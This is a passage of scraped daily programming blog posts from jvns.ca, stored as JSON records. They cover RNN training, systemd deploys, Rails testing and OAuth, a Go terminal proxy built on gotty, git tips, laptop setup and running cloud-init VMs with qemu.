\n\n \n is doing gradient clipping helping? \n why does the loss for my model climb so much? why is that even possible? \n why does BPTT with a sequence length of 40 not work, but a sequence length of 10 work? \n does randomizing the sequence length with BPTT help? \n is it an “exploding gradient” if the norm of the gradient goes up to 12? (i think the answer might be “no”?) \n is it a “vanishing gradient” if the norm of the gradient goes down to 0.05? (i think the answer might be “yes”?) \n does the  seq_len  dimension in  PyTorch’s LSTM\nclass  refer to\nBPTT? (in other words, do I have to implement BPTT myself or will that LSTM class do it for me if I format my data the right way?) \n how can I tell if I’m having numerical stability issues? \n \n\n Maybe I can answer some of those questions next! \n\n some text the BPTT model generated \n\n that than their conirot-ula thine not wate) For then in that my shill, And\nTime, Wiss envage so love at thes: Time worture women of their cay bu thee\nwisted all Tom werthen hear momed. An is perselfed? Bu mundeve teassed for my\nsead wherey tood the ob'e, With eres, The ecref of heaven. 25 Levery I t\n \n\n This seems really similar to the non-BPTT text: \n\n at soerin, I kanth as jow gill fimes, To metes think our wink we in fatching\nand, Drose, How the wit? our arpear War, our in wioken alous, To thigh dies wit\nstain! navinge a sput pie, thick done a my wiscian. Hark's king, and Evit night\nand find. Woman steed and oppet, I diplifire, and evole witk ud\n \n\n"},
{"url": "https://jvns.ca/blog/2020/12/08/day-21--wrangling-systemd/", "title": "Day 21: wrangling systemd & setting up git deploys to a VM", "content": "\n     \n\n On Monday I decided to take a break from machine learning, so I spent all day\nsetting up a server for this incidents-as-a-service project I’m working on on\ndigital ocean. \n\n Here are a few things I learned: \n\n digital ocean apps are compatible with Heroku \n\n I was originally going to use GCP for this project, but I got mad because of my\nexperience with IAM on Friday and decided to try Digital Ocean instead. It\nturns out that Digital Ocean is MUCH EASIER to use than GCP (at least at\nfirst) and so I decided to try it out. \n\n One cool thing I found out is that Digital Ocean’s new “app platform” lets you\ndeploy Heroku apps to it pretty seamlessly. \n\n This ended up not working for me because I needed to SSH to other instances for\nmy project and this doesn’t seem to be possible from a Digital Ocean “app”\n(which I guess is a container behind a pretty restrictive firewall). \n\n So I decided to use a Digital Ocean VM instead. \n\n digital ocean has nice VM images \n\n My project is a Rails app. Digital Ocean seems to have a “marketplace” with a\n Ruby on Rails  page, and so I clicked “Create Ruby on Rails droplet” and it created a VM for me that had: \n\n \n nginx \n Rails \n Postgres \n systemd services for all of those \n \n\n all set up what seems to be a pretty reasonable way. I thought this was great\nand it seemed to be a pretty good starting point to set up a Rails app. I\nthought about using containers but I decided not to, maybe I’ll go back and\nmake the whole thing more reproducible later. \n\n I liked that there’s a Postgres already running on the machine, since it’s\nway cheaper than a managed Postgres. And I figure if I want to migrate to\nmanaged Postgres I can always do that later. \n\n you can implement push-to-deploy with a git post-receive hook \n\n Once I had that VM running, I was mad that I didn’t have the nice “push to\ndeploy” experience that I got with Heroku / digital ocean apps, so I Googled other options. \n\n I found this really nice blog post  Deploying Code with a Git Hook on a DigitalOcean Droplet \nabout how to use a git post-receive hook to deploy to a VM on push. \n\n This approach feels more like “hacked together bash script” than “fancy stable\nsystem” but after spending some time wrangling systemd I got it to work and\nit’s kind of fun to have a more basic system where I push directly to the VM\nI’m running my code on. \n\n systemd can run a script before your service starts \n\n After I deploy my code with  git push , I need to make sure to install new gems\n/ run Rails migrations / etc. \n\n There are lots of ways to do this, but I found out that you can set an\n ExecStartPre  in systemd to run a script before the service starts. So if I\nrun  service rails restart , it’ll run my  restart.sh  script first and install\nany new required gems, etc. \n\n My Rails systemd file’s Service section looks something like this: \n\n [Service]\nType=simple\nUser=rails\nGroup=rails\nWorkingDirectory=/my/rails/directory\nExecStart=/bin/bash -lc 'bundle exec puma'\nEnvironment=RAILS_ENV=production\nExecStartPre=/bin/bash -x /path/to/my/restart/script\nTimeoutSec=300s\nRestartSec=300s\nRestart=always\n \n\n I needed to make  TimeoutSec  bigger because the restart script runs  bundle\ninstall  and sometimes that can take a while. \n\n journald needed to be restarted for some reason \n\n I spent a LOT of time being confused because systemd-journald didn’t have my\nRails app’s logs, even though it seemed to be running correctly. \n\n Eventually I restarted journald and it fixed everything, but I don’t really\nunderstand why. I really don’t understand systemd yet but maybe one day I’ll\nget there. \n\n that’s all! \n\n I found setting up a VM in a very non-reproducible way with a hacked together\nbuild/deploy system pretty fun. I might redo it to use containers/something\nthat might be easier to maintain if the project ends up being something I want\nto keep. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/05/day-19--clustering-faces-using-an-autoencoder/", "title": "Day 19: Clustering faces (poorly) using an autoencoder", "content": "\n     \n\n I’ve been working on clustering faces using an autoencoder, and I finally have\nsome fun screenshots to share so here they are. \n\n our training data: faces \n\n Our input data looks like this: (from the  google quickdraw dataset ) \n\n \n \n \n\n Each face is represented as a sequence of vectors, one vector for every\nline in the face (kind of like an SVG path). Here’s an example: \n\n tensor([[-0.0956, -0.2869,  0.0000],\n        [-0.3108, -0.1434,  0.0000],\n        [-0.5738,  0.1673,  0.0000],\n        [-0.3108,  0.2391,  0.0000],\n        [-0.3586,  0.4303,  0.0000],\n        ... lots more ...\n \n\n the idea: many vectors -> one vector -> many vectors \n\n The way RNN autoencoders work that there’s an  Encoder  RNN that turns this\nsequence of vectors into 1 vector (mine is 50 dimension), and then a  Decoder \nRNN that turns the 1 vector back into a sequence of vectors. \n\n The idea is to train the Encoder and Decoder networks so that\n Decoder(Encoder(x))  is as close to  x  as possible for every  x  in the\ntraining set. I used the mean squared error as a loss function to start. \n\n The training didn’t go that well – I got the loss to go down a bit (from 0.3\nto 0.25), but it definitely didn’t seem that well trained. I think it would\nhave maybe done better if I trained it for longer but I got bored. \n\n the autoencoder results \n\n Here are 4 pairs of  x  and  Decoder(Encoder(x))  from the training set \n\n \n \n \n\n I’m actually pretty impressed by this – it seems to have figured how to draw a\ncircle of about the right size for the face, and vaguely that it should draw\nsomething inside the circle. Way better than nothing! \n\n doing some clustering \n\n My original goal was to cluster the faces by taking  Encoder(x)  for the inputs\nin the training set  and clustering those vectors. \n\n I used\n DBSCAN \nfrom scikit-learn more or less arbitrarily, basically because it seemed like it\nmight work better for higher dimensional vectors (I had 50 dimensions) \n\n here’s what the clusters looked like: \n\n \n \n \n\n It seems to have clustered them mostly by the size of the face, and not by any\nof the interior features. This makes sense because the decoder seems to be able\nto reproduce the size of the face pretty effectively but totally fails at\nreproducing the interior features. Neat! \n\n next: see if I can get it to draw some eyes \n\n My next goal I think is to see if I can improve the autoencoder network so that\nit can also draw the components inside the face better. We’ll see how it goes! \n\n"},
{"url": "https://jvns.ca/blog/2021/01/07/day-33--a-login-bug--a-git-trick--and-generating-yaml-files/", "title": "Day 33: pairing is magic and beautiful git diffs", "content": "\n     \n\n a silly Rails login bug (or: pairing is magic) \n\n On Wednesday morning suddenly I wasn’t able to login in my dev environment,\neven though it was working in prod and it had worked the day before and I\nthought I hadn’t made any changes to my login code. \n\n The error was really weird though – it was telling me that it was expecting a\n provider  column in my users table (for the OAuth provider), and there wasn’t\none! How could this be?? I was sure hadn’t made any changes to that table. \n\n I felt really frustrated so I asked if someone wanted to pair with me on it.\nMikkel agreed to pair with me, and in about 10 minutes we established that: \n\n \n the production database had a  provider  column and the dev database didn’t \n running  git log -S provider  showed that I had in fact deleted the\n provider  column from my dev schema a few hours before at some point, which I definitely did not remember doing, but, ok \n \n\n I’m always amazed by how quickly pairing can turn “UGH THIS IS TERRIBLE” into\nsolving the problem really quickly. \n\n This was super easy to fix, I just added the offending columns back and\neverything was good. Hooray! \n\n I’m still not 100% sure how/why this happened (I think something was wrong in my Rails migrations for\nan unknown reason, and when I ran  rake db:migrate  to recreate my dev database\nit broke my schema) \n\n git trick 1: git log -S \n\n I ran  git log -S provider  to find every commit that had added/removed the\nstring  provider  and Mikkel was like WHAT IS THAT??? Pairing is magic! \n\n On Zulip after we ended up discussing the difference\nbetween  git log -S  and  git log -G . I learned that  git log -S  doesn’t\nactually search diffs to find diffs containing the string, instead it just\ncounts occurrences of the string and reports when the count was changed. \n\n So I learned something too! \n\n git trick 2: beautiful diffs with  delta \n\n I told Kamal about this  git log -S  thing, and he showed me some other\ngit thing on this computer where you can  git log  just changes to a specific\nfunction. But I got distracted from what he was telling me because I noticed\nthat he had these INCREDIBLY BEAUTIFUL DIFFS in his terminal, that looked like\nthis: \n\n \n\n So I was like KAMAL WHAT IS THAT?!?!?! \nThis is called  delta . It’s pretty easy\nto install and I configured it by adding these things to my  ~/.gitconfig . It\nhas a million options that I didn’t really look into but now my diffs are\nBEAUTIFUL. (that screenshot is actually from my computer) \n\n [core]\n\tattributesfile = ~/.gitattributes\n\n[interactive]\n    diffFilter = delta --color-only\n\n[delta]\n    features = side-by-side line-numbers\n    whitespace-error-style = 22 reverse\nsyntax-theme = GitHub\n \n\n git trick 3: git log –patch \n\n I also learned that you can get a diff with your  git log  with  git log --patch . \n\n This was cool to know because I’ve been copying and pasting commit IDs from\n git log  and doing  git show COMMIT_ID  to look at a diff for like 7 years. \n\n Python’s pathlib is nice \n\n My actual goal for the day was to write a Python script to generate my\n cloud-init.yaml  file by syncing some files from a local directory. \n\n This post is long enough already and it’s not too interesting, so I’ll just say\nthat I learned about the\n pathlib  module and I thought it was nice\nnice. A few things you can do with a path: \n\n path = \"/home/bork/\"\ntextfile = path.joinpath('x.txt') # /home/bork/x.text\ntextfile.read_text() # read the contents as a string\ntextfile.read_bytes() # read the contents as binary\ntextfile.relative_to(path) # 'x.txt', lets you get the relative version of a path\n \n\n a working directory context manager \n\n In my Python script, I wanted to do a bunch of things where I changed to a\ndirectory, did some things, and then changed back. This felt like a context\nmanager to me, so I googled “python working directory context manager” and\nfound one  in a github gist . \n\n It always brings me a lot of joy when I think of a little bit of simple code\nthat I want to exist and I can kind of just summon it with a Google search. \n\n It was really simple so I just copied it into my code: \n\n import os\nfrom contextlib import contextmanager\n@contextmanager\ndef working_directory(path):\n    prev_cwd = os.getcwd()\n    os.chdir(path)\n    try:\n        yield\n    finally:\n        os.chdir(prev_cwd)\n \n\n and then I could use it: \n\n \nwith working_directory(directory.joinpath('files')):\n    synced = sync_files(cloud_init_yaml['write_files'])\n    cloud_init_yaml['write_files'] = list(synced)\n \n\n"},
{"url": "https://jvns.ca/blog/2021/01/13/day-37--a-new-laptop-and-a-little-vue/", "title": "Day 37: A new laptop and a little Vue", "content": "\n     \n\n Hello! Tuesday was mostly consumed by setting up a new laptop so I’ll keep this pretty short. \n\n Things in this post: \n\n \n setting up the new laptop (very boring honestly but I seem to have written a lot about it anyway) \n switching to vue.js \n a problem I’m having with my setup for proxying SSH connection \n \n\n a new laptop arrived! \n\n I bought a new laptop (a thinkpad t14s, the AMD one) and it arrived so of\ncourse I got super distracted and had to set it up immediately. It’s quite a\nbit faster than the old computer (a thinkpad x250) which is fun. I’m a bit mad\nthat it has soldered RAM and that in general it’s harder to service myself but\nI went with it anyway. \n\n how I set up a new computer \n\n Here’s how I set up a new computer and how I do OS upgrades. I’ve done this 3-4\ntimes in the last 3 years and it works pretty well. The main things are: \n\n \n I copy my entire home directory to the new computer, which is kind of a\nmagical thing because it means all my settings are right there when I’m done \n I never upgrade Ubuntu, I always reinstall from scratch. (I tried breaking\nthis rule and upgrading Ubuntu this year and it failed very spectacularly so\nI’m even more personally committed to this rule :) ) \n \n\n \n Go find my 1TB external drive in a box downstairs \n Find a USB key and put the latest Ubuntu LTS installer on it \n \n\n On the old computer: (or before rebooting, in the case of an upgrade) \n\n \n Back up my home directory with  cd /home; sudo tar -cf - bork | pv | /media/the_drive/homedir.tar . The  pv  is important to me because it takes a long time and I get impatient so it’s nice to have a progress indicator. \n Run  sudo dpkg -l > /media/the_drive/packages \n \n\n on the new computer (or after rebooting) \n\n \n Install Ubuntu with disk encryption, don’t bother setting up a partition table, format the whole drive \n Unpackage my home directory from the external drive and put it back at  /home/bork  ( cat /media/the_drive/homedir.tar | pv | tar -xf - ) \n Go through the list of packages from  dpkg -l  and manually pick out the ones I want to install and put them in a text file called  to_install  or something (usually there’s a bunch of crap I installed on the previous computer that I don’t necessarily need, so I find sorting through it manually is better) \n Run  cat to_install | sudo xargs apt install \n Over the next few days/weeks, install everything I missed as I notice it \n \n\n I don’t claim that this is the Best Way to do things, it’s just what I do and\nit works ok for me so far. I used to keep my home directory in a separate\npartition so I could easily reinstall my OS and leave my home directory alone\nbut I don’t anymore for some reason that I don’t remember. \n\n problems I still have with the new laptop \n\n I have a bunch of the usual new computer problems: \n\n \n it doesn’t suspend when I close the lid yet \n something is a little wonky with my vim configuration and the top bar looks weird \n I got a new Yubikey Nano and I wanted to set PAM up so that I could  sudo \nwithout typing in a password, but the instructions on their website aren’t\nworking for me. I took this as an opportunity to learn a little about PAM so\nI bought  Michael Lucas’s Pam Mastery\nbook  because I really like his writing.\nIt helped me get more debugging information about the issue but I still don’t\nknow what’s wrong. \n \n\n switching to vue.js \n\n I’d been using a tiny bit of stimulus.js for my site. I was dissatisfied with\nit because to conditionally show a div depending on the state I needed to add\nCSS styles myself to show / hide content, like\n this.pendingDiv.classList.add('hidden') \n\n So I switched to vue.js which I’ve used for a few small projects before and\nlike and I like it better. \n\n a problem with my proxy server \n\n While testing my new vue.js code, I noticed that my Javascript was working fine\nbut that I was having a problem on the backend. \n\n I use this Go proxy server ( gotty ) to proxy SSH connections to my VMs. The way it works right now is: \n\n \n I start  gotty  processes from my Rails app \n each SSH connection gets its own port \n I have another Go proxy (100 lines of Go) that proxies  /proxy/SSH_CONNECTION_ID  to the port of the right backend processes \n the second go proxy find outs port to use by querying an endpoint in the Rails app \n \n\n I find this whole thing pretty messy and it’s also quite unreliable, the\n gotty  processes sometimes don’t quite start up right and I’m always worried\nabout them dying and I have no real way to manage them. So I think I’ll work on\nthat next. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/10/day-23--some-rails-testing/", "title": "Day 23: a little Rails testing", "content": "\n     \n\n I’ve been working on a little Rails app to manage a bunch of virtual machines\nthat run programming puzzles, and in the last couple days I ran into a problem\nI run into a lot: I forgot about testing! \n\n here’s how it goes: \n\n \n start writing some code with no tests, think “this is fine” \n 2 days later, realize I’m spending a lot of time manually testing and fixing\nthe same bug 3 times because I broke it again \n remember that automated testing exists \n write tests and everything is 10x better \n \n\n A few small nice things that I’ve found in my first day or two of doing testing in Rails: \n\n my Rails app comes with tests! \n\n I’ve haven’t really used Rails much before, and when I started writing tests I\nnoticed that  rails generate scaffold Puzzle  had generated a bunch of tests\nfor me for the Puzzle controller! \n\n This was really nice because it gave me a template to start from \n\n there are fixtures! \n\n Every model has a corresponding file called  test/fixtures/MODEL_NAME.yml  that\nhas a bunch of data used to create test objects. For example, here are some\nfixtures for my  VirtualMachineInstance  model: \n\n manuela: \n   email: manuela@example.com\nrishi:\n   email: rishi@example.com\n \n\n This means that I can quickly create a test object like this: \n\n @user = users(:rishi)\n \n\n there are authentication helpers to help manage logins! \n\n I’m using a gem called Devise right now to handle logins, and it comes with a\nbunch of test helpers to pretend that I’m logged in to the site when accessing\na page. This is super useful in integration tests! \n\n Here’s what that looks like \n\n   setup do\n    @user = users(:rishi)\n    @user.save\n    login_as(@user, :scope => :user)\n  end\n \n\n mocking HTTP requests is easy \n\n I have some code in my project that talks to an API to launch virtual machine\ninstances. I obviously don’t  actually  want to launch VM instances in my tests\n(could get expensive!), so I wanted to mock out the calls to the API. Here’s\nhow that works: \n\n WebMock.disable_net_connect!\nstub_request(:get, \"https://api.digitalocean.com/v2/account/keys?page=1&per_page=20\").\n  to_return(status: 200, body: '{\"ssh_keys\":[],\"links\":{},\"meta\":{\"total\":2}}')\n \n\n The nice thing is that  WebMock.disable_net_connect!  prevents Ruby from making\nany external API requests, and if one happens then it prints out an example of\nsome code I could write to mock that request. \n\n integration tests seem easy at first \n\n I was spending a lot of time clicking on links and making sure that if it\nworked if I went to X page and then Y page from there. \n\n I was surprised by how easy Rails makes it to write integration tests! Here’s\nan example of an integration test that I have that makes sure that right after\nyou start a puzzle (which launches an instance), the instance’s status is\n“pending”. So little code! \n\n test \"status is pending right after instance started\" do\n    get '/puzzles/1/start'\n    get '/instances/220816290/status'\n    assert_response :success\n    assert_equal({\"status\" => \"pending\"}, response.parsed_body)\nend\n \n\n This code definitely has a “magical Ruby” feel but I don’t really mind and it’s\nfun to write so far. \n\n that’s all! \n\n One thing I really appreciate about Rails is that there are like 15 million\nblog posts and Stack Overflow answers about using it, which has made it pretty\neasy so far to get all my questions answered. \n\n It really feels like if I’m confused about something, many thousands of people\nhave been confused about the exact same thing and have written about it in 1000\ndifferent places, which is a nice change of pace from some of the weirder\nthings I’ve tried to learn about. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/08/day-22--getting-oauth-to-work-in-rails/", "title": "Day 22: getting OAuth to work in Rails", "content": "\n     \n\n Today my goal was to set up OAuth login for a Rails project. \n\n This was all pretty confusing because a) I don’t understand Rails yet and b) I\ndecided to use an authentication library called Devise on top of it that I also\ndon’t understand. \n\n But one nice thing about Rails is that there are about 10 billion blog posts &\nStack Overflow questions that make it possible to figure out what’s going on\neven if you don’t really know anything. \n\n following tutorials without understanding them is kind of fun (but doesn’t work, of course) \n\n I found an extremely nice content marketing tutorial on the digital ocean blog called  How To Configure Devise and OmniAuth for Your Rails Application \nexplaining how to set up OAuth with Rails. I followed all the steps without really understanding them and it kind of worked! Hooray. \n\n This worked mostly fine when setting up GitHub login, but I also needed to\nimplement a custom OAuth provider (for the Recurse Center OAuth), and so I\nlearned a few things while fixing the bugs with that. Here they are. \n\n it’s important to request the user’s information from the OAuth provider \n\n I was just using OAuth for login, not to access an API, and (based on a very\nsketchy understanding of how OAuth works) I had this vague notion that once the\nOAuth server sent my application an access token, it would be “done”. \n\n But I’d copied this  template for creating a custom Omniauth provider from the docs  and filled in all the\nfields, and it didn’t work! \n\n It turns out that I’d misunderstood this line of code: \n\n access_token.get('/me')\n \n\n which I thought meant “get the  /me  field from a hashmap called\n access_token ” but which  actually  means “make an HTTP request to the OAuth\nprovider’s API using the access token, and get the path  /me ”. This is where\nthe user’s name / email address / etc comes from, so it’s pretty important to\nget right. \n\n I’d gotten the path wrong (since I didn’t realize it was a HTTP request at\nall!), and fixing the path made my OAuth integration work. \n\n you need to set the  X-FORWARDED-PROTO  header to  https \n\n In OAuth, you need to send a  redirect_uri  to the OAuth provider (eg GitHub)\nwith the URL of the page on your site to go back to. \n\n In my case, this  redirect_uri  was supposed to be\n https://mysite.com/users/auth/github/callback . But my application was sending\na  http  URL instead of an  https  URL. What? Why? \n\n It turns out that something in Rails (I’m still not sure what honestly) looks\nat the  X-FORWARDED-PROTO  header from nginx to decide whether to build  https \nor  http  links. My site was behind a Cloudflare proxy, so the requests coming\ninto the site were all HTTP requests, and so my app thought  http://...  was\nthe correct URL to use. \n\n But it was not!!! \n\n I added a \n\n proxy_set_header X-FORWARDED-PROTO https; \n \n\n and everything was fixed. \n\n tomorrow: maybe stop using devise? \n\n Originally I thought I needed Devise to use the Omniauth gem, but it seems like\nmaybe I don’t ( according to this explanation on Railscasts ). \n\n And devise seems pretty complicated, so now that I have everything working I’m\nconsidering totally removing it and instead just using Omniauth. We’ll see if I\nfeel like doing that or if it’s more fun to add actual features. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/14/day-38--modifying-gotty-to-serve-many-different-terminal-applications-at-once/", "title": "Day 38: Modifying gotty to serve many different terminal applications at once", "content": "\n     \n\n In the  last post  I talked about a problem I was having with gotty. \n\n I’m going to recap the problem, and then we’ll talk about what I did about it!\nBasically I paired on the problem with Chetan (another Recurser) and we\nsolved it in a really satisfying way and it was way easier than I thought it would be. \n\n Everything from this post is in a github repository here:  https://github.com/jvns/multi-gotty/ \n\n what’s gotty? \n\n gotty  is a Go webserver that lets you put your terminal on a website. So\nfor example if you run  gotty top , it’ll start a webserver on port 8080 where it shows the output of  top . \n\n Or if you run  gotty -w bash , it’ll start bash and start a webserver where\nanyone can type in commands and run them in your shell. \n\n In my puzzle game thing I have people ssh to some virtual machines I’ve\nsetup. I’ve been using  gotty  to give them a terminal in the browser. \n\n the problem: a really fragile setup \n\n My problem was that I needed to manage a bunch of different SSH connections\n(one per puzzle that a person has open), and  gotty  only supports one session\nat a time. \n\n So I set something up where I ran a bunch of different  gotty  processes on\ndifferent ports, and then stored a mapping of which session mapped to which\nport, and wrote a small go proxy server that proxied  /proxy/SESSION_ID  to the\nright port number on the backend. \n\n There were 3 different pieces in this setup: \n\n \n the  gotty  processes (potentially lots of them) \n the other go server that proxied connections to those processes \n the Rails server, which was responsible for starting the  gotty  processes on\nthe right ports and telling the go server which ports they were running on \n \n\n the idea: modify  gotty  so that it can manage multiple websocket connections \n\n I wanted a much simpler setup where I could just go to\n http://mysite.com/terminal_session/SOME_ID/  and have the right SSH connection\nautomatically set up. \n\n I’m having some trouble explaining what I want the code to do in English so\nI’ll just show you some code, because it wasn’t really that much code. \n\n the code: really simple! \n\n I was originally worried that it would be really complicated to modify  gotty \nto handle multiple websocket connections but actually it was very\nstraightforward!  gotty  had just 3 HTTP handler functions\n( handleAuthToken ,  handleWS , and a statics handler), so all we needed to do\nwas call those in a slightly different way. \n\n Here’s what the new HTTP handler we wrote looks like. It basically just has an if\nstatement which calls  app.handleWS  with a custom command if the path ends in\n /ws . I think there might be a more idiomatic Go way to do this but I don’t\nknow what it is yet. You can see it in context  here \n\n func (app *App) handleRequest(w http.ResponseWriter, r *http.Request) {\n\tstaticHandler := http.FileServer(\n\t\t&assetfs.AssetFS{Asset: Asset, AssetDir: AssetDir, Prefix: \"static\"},\n\t)\n\tpath := r.URL.Path\n\tparts := strings.Split(path, \"/\")\n\t// TODO: this panics if the path doesn't have enough stuff in it\n\t// TODO: actually match on /proxy and don't do this strings.Split thing\n\tprefix := strings.Join(parts[:3], \"/\")\n\tif strings.HasSuffix(path, \"/auth_token.js\") {\n\t\tapp.handleAuthToken(w, r)\n\t} else if strings.HasSuffix(path, \"/ws\") {\n\t\tid := parts[2]\n\t\tmapping := app.readMapping()\n\t\tif command, ok := mapping[id]; ok {\n\t\t\tapp.handleWS(command, w, r)\n\t\t}\n\t} else {\n\t\thttp.StripPrefix(prefix, staticHandler).ServeHTTP(w, r)\n\t}\n}\n \n\n The parsing code for the path here is still really bad but I’ll fix it at some\npoint. \n\n The only real other code we had to write was this  readMapping  function which\nmaps an ID from the URL to a command to run. This is just making an HTTP\nrequest to a server (my Rails app) and decoding some JSON: \n\n func (app *App) readMapping() map[string][]string {\n\tresp, err := http.Get(app.commandServer)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tvar mapping map[string][]string\n\tjson.Unmarshal(body, &mapping)\n\treturn mapping\n}\n \n\n http.ResponseWriter and http.Request are great \n\n The real star here is the Go  http  interfaces. Because all Go HTTP handlers\ntake a  http.ResponseWriter  and a  http.Request , it’s super easy to wrap\nother HTTP request handlers and make them behave slightly differently. \n\n I’d forgotten how it worked but it was pretty easy to pick up again. \n\n I couldn’t use gotty as a library \n\n We forked gotty instead of using it as a library because the functions we\nneeded ( handleWS  and  handleAuthToken ) were private, you can tell because\nthey’re lowercase and in Go the way you know if a function is private or public\nis based on whether it starts with an uppercase or lowercase letter. \n\n pairing is magic \n\n I paired on this with Chetan and it was SO MUCH easier to do with someone else\nthan on my own. I really thought this would be super hard and it wasn’t – it\nwas really helpful to talk it through with another person and we got the main\nfunctionality working in just 1 hour! \n\n the new code works WAY BETTER than my old setup \n\n Having everything coordinated in 1 simple Go program instead of having 3\ndifferent moving pieces to coordinate works SO MUCH BETTER. I tried it out and\nbasically just worked immediately and reliably instead of constantly being\nflaky and failing like my old setup. \n\n here’s the code \n\n I put the code on Github here:  https://github.com/jvns/multi-gotty/ . It has\nsome problems (like the bad path parsing code I mentioned, and it doesn’t let you\nchange the accepted  Origin:  headers yet), but it does do what I wanted to do! \n\n Here’s the  complete diff \nof all the code we changed / deleted in gotty to make this work. We deleted most of gotty’s command line\nflags and support for a bunch of things like TLS because I didn’t need them and\nI didn’t think anyone else would want to use it. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/10/day-24--a-short-talk-about-blogging-myths/", "title": "Day 24: a short talk about blogging myths, and a debugging tip", "content": "\n     \n\n Today at RC I gave a 10-minute talk about blogging myths. I might turn it into a blog\npost later, but for now I’ll just post the slides. \n\n “blogging myths” slides \n\n The myths are: \n\n \n you need to be original \n you need to be an expert \n posts need to be 100% correct \n good bloggers don’t write bad posts \n you need to explain every concept \n page views matter \n \n\n \n\n Here’s a  link to the slides on speakerdeck ,\nthough the aspect ratio there is broken for some reason as I’m writing this. \n\n debug by adding print statements to a library’s code \n\n I was debugging with someone today and I was reminded of one of my favourite debugging techniques! \n\n Sometimes when I’m debugging, I’m using a library, and I’m getting an error,\nand I have NO IDEA why and all the Googling in the world just does not tell me anything useful. \n\n When this happens, I like to: \n\n \n grep the library’s code for the function/class I’m trying to use (or the error I’m getting) \n add extra print statements to the library to give me more information \n figure out the bug \n remove the print statements \n \n\n This works really well with Ruby / Node / Python / Go – anywhere where it’s\nnormal to have a directory like  node_modules  with all the code for all your\ndependencies where you can easily edit & rerun the code. \n\n Occasionally doing this helps me find a bug in the library, but 90% of the time\nthe problem is with my code and it just helps me understand how the library is\nactually supposed to work. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/08/day-34--learning-about-qemu/", "title": "Day 34: Learning about qemu", "content": "\n     \n\n On Thursday, I spent basically the whole day being confused about qemu. \n\n the goal: automatically test my  cloud-init.yaml  files \n\n Right now I have these cloud-init.yaml files that I’m using to provision VMs,\nand I got tired of spinning up DigitalOcean VMs and manually SSHing into them\nto test things out. \n\n So I figured: I can instead provision the VMs on my own computer! \n\n qemu is like ffmpeg \n\n In RC daily checkins, I said that I was working on this and Alex mentioned that\nhe prefers qemu to virtualbox. I’ve never quite understood qemu, so I chatted\nwith him a bit about why he likes it and it was super helpful. \n\n It seems that one of the main problems with Virtualbox is that it doesn’t have a command\nline, so to use it you basically have to use it through something like Vagrant\n(or by clicking things in a GUI). Also apparently Oracle doesn’t really\nmaintain it. \n\n qemu  is a command line tool in a similar style to ffmpeg, with a million\ncommand line arguments that you can use to accomplish literally anything (which\nmeans it’s very nontrivial to learn and is also an incredible tool). \n\n The reason qemu is like ffmpeg is that they’re by the same person, Fabrice Bellard. \n\n I also learned about\n ffmprovisor  (a list of FFmpeg\nrecipes) from Alex, which I’m definitely going to use the next time I need to\nuse ffmpeg. \n\n Here are some of the ways I failed to get qemu to work, and what worked \n\n failure 1: google how to use cloud-init with qemu \n\n I searched for something like “how to set up cloud-init with qemu” and found a\nbunch of articles that explained how to set up a VM and run  cloud-init  with\nqemu using a tool called  virt-install . \n\n Here’s what I know about  virt-install : \n\n \n it’s part of of a package called  libvirt \n libvirt  is some sort of abstraction over qemu and other virtualization providers \n I can’t get it to work \n \n\n I spent a bunch of time trying to get various things using  virt-install  to\nwork – I added myself to the  libvirt  group, installed some more packages,\ntried some random commands related to bridges that I found on the internet to\nget the networking to work, and got very frustrated eventually gave up. \n\n failure 2: try to use Vagrant to set up a libvirt VM with cloud-init \n\n Then I thought, ok, maybe I can use Vagrant! Vagrant has a  libvirt  backend\nthat you can use to run KVM virtual machines, and also Vagrant has some\nexperimental cloud-init support. \n\n The main thing I learned is that you need to enable this\n VAGRANT_EXPERIMENTAL=\"cloud_init,disks\"  environment variable to make this\nwork, but after I did that it I still couldn’t get it work. \n\n There’s probably some way to get this to work but I didn’t find the\n“experimental” state reassuring so I moved on. \n\n success: using qemu directly \n\n I then decided to use the  qemu  command line directly. \n\n I stumbled on this  getting started with qemu  blog\npost, which has some very unnecessary hostile language about how people who use\nVirtualBox make “poor life choices and are an embarrassment to us all”, but you\ntake what you can get and it was the first thing I could get to work, which was\ngreat! And it was really simple. \n\n After looking some more and asking questions in RC internal chat, I got qemu to\ndo what I wanted! \n\n how to start an Ubuntu image with cloud-init and qemu \n\n Here’s exactly how I ended up using qemu to start an Ubuntu image that runs\ncloud-init, if anyone is Googling this in the future. I ran this exact script\nand it worked for me. \n\n # 1. Download a Focal image from Ubuntu's website\nwget https://cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img\n# 2. Create user-data and meta-data files\necho \"#cloud-config\npassword: banana\nchpasswd: { expire: False }\nssh_pwauth: True\nwrite_files:\n- content: \"hello world!\"\n  path: /hello.txt\n\" > user-data.yaml\necho \"instance-id: $(uuidgen || echo i-abcdefg)\" > meta-data.yaml\n# 3. Package the user-data and meta-data files into a drive image\ncloud-localds meta-data.img  user-data.yaml meta-data.yaml\n# 4. Create a qcow2 snapshot of the Focal image\nqemu-img create -b focal-server-cloudimg-amd64.img -f qcow2 -F qcow2 snapshot.qcow2\n# 5. Start qemu!\nqemu-system-x86_64 --enable-kvm -m 2048 \\\n    -drive file=snapshot.qcow2,format=qcow2 \\\n    -drive file=meta-data.img,format=raw \\\n    -net user,hostfwd=tcp::2222-:22 -net nic\n \n\n I needed to wait a minute for the machine to boot, and once it was done, I ran: \n\n ssh -p 2222 ubuntu@localhost\n \n\n It asked for the password (“banana”), and I was in a VM with the  /hello.txt \nfile that I created in my  user-data.yaml  file! Hooray! \n\n ubuntu@ubuntu:~$ cat /hello.txt \nhello world!\n \n\n This felt way simpler to me than all  virt-install  examples I found. \n\n Obviously it’s better to use ssh key authentication but I used a password in\nthis example just so that I could put the whole thing in a self-contained shell\nscript. \n\n things I still don’t understand \n\n some questions I still have: \n\n \n what the two  -drive  options to qemu do – is the idea that cloud-init reads\nfrom another “hard drive”? \n does the disk image with the metadata and userdata files have a filesystem?\nwhat filesystem? \n how exactly is my qcow2 “snapshot” of the Focal image is only 11MB? I expected\nthe snapshot to make a copy of the data and be like 500MB. Obviously that’s\nnot true so 